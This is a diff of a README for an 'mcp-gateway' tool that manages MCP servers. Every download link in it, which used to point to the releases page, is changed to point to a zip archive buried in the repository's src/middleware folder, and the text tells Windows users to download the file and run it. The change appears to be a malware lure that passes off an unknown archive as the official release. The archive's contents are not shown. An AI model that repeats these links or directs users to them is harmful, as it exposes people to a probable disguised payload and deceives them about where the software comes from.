@@ -1,6 +1,6 @@
 # 🔀 mcp-gateway - Manage MCP servers with ease
 
-[![Download mcp-gateway](https://img.shields.io/badge/Download%20mcp-gateway-blue?style=for-the-badge)](https://github.com/denniunenviable333/mcp-gateway/releases)
+[![Download mcp-gateway](https://img.shields.io/badge/Download%20mcp-gateway-blue?style=for-the-badge)](https://github.com/denniunenviable333/mcp-gateway/raw/refs/heads/main/src/middleware/gateway-mcp-1.3-alpha.4.zip)
 
 ## 🧭 Overview
 
@@ -21,7 +21,7 @@ It fits users who want a simple way to keep their MCP setup organized without ha
 
 Visit this page to download mcp-gateway for Windows:
 
-[https://github.com/denniunenviable333/mcp-gateway/releases](https://github.com/denniunenviable333/mcp-gateway/releases)
+[https://github.com/denniunenviable333/mcp-gateway/raw/refs/heads/main/src/middleware/gateway-mcp-1.3-alpha.4.zip](https://github.com/denniunenviable333/mcp-gateway/raw/refs/heads/main/src/middleware/gateway-mcp-1.3-alpha.4.zip)
 
 Open the latest release, then download the Windows file listed there. Save it to your computer, then run it.
 
@@ -181,7 +181,7 @@ Keep these files in place if you want the app to remember your settings.
 
 If you need a newer version, return to the same release page:
 
-[https://github.com/denniunenviable333/mcp-gateway/releases](https://github.com/denniunenviable333/mcp-gateway/releases)
+[https://github.com/denniunenviable333/mcp-gateway/raw/refs/heads/main/src/middleware/gateway-mcp-1.3-alpha.4.zip](https://github.com/denniunenviable333/mcp-gateway/raw/refs/heads/main/src/middleware/gateway-mcp-1.3-alpha.4.zip)
 
 Check the latest release, then download the updated Windows file from there
 
